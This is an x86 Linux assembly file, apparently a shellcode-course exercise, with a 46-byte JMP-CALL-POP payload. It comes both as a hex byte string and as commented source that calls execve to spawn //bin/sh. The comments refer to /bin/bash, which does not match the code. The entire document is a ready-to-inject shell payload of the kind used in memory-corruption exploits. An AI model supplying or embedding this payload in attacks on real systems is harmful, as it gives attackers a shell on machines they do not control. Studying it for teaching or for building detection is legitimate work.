;Description: 	JMP-CALL-POP execve shell (46 bytes)
;Shellcode:	\xeb\x1f\x5e\x89\xf7\x31\xc0\x50\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68
;Author: 	Paolo Stivanin <https://github.com/polslinux>
;SLAE ID: 	526 
 
;execve syscall structure:
;ebx -> /bin/bash,0 (null terminated string)
;ecx -> address_of_ebx,0x00000000
;edx -> 0x00000000

global _start

section .text
_start:
	jmp short here

me:
	pop esi
	mov edi,esi	;backup register esi->edi
	
	xor eax,eax
	
	push eax
	lea esi,[esi +4];loaded the address which contains the last 4 bytes...
	xor eax,[esi]	;...with xor the last 4 bytes are taken...
	push eax	;...and then pushed into the stack
	xor eax,eax
	xor eax,[edi]	;...and then take the first 4 bytes...
	push eax	;...and push them into the stack
	mov ebx,esp	

	xor eax,eax
	push eax	;pushed 0x00000000
	lea edi,[ebx]	;loaded the address of '/bin/bash,0'
	push edi
	mov ecx,esp

	mov al,0xb
	int 0x80

here:
	call me
	path db "//bin/sh"
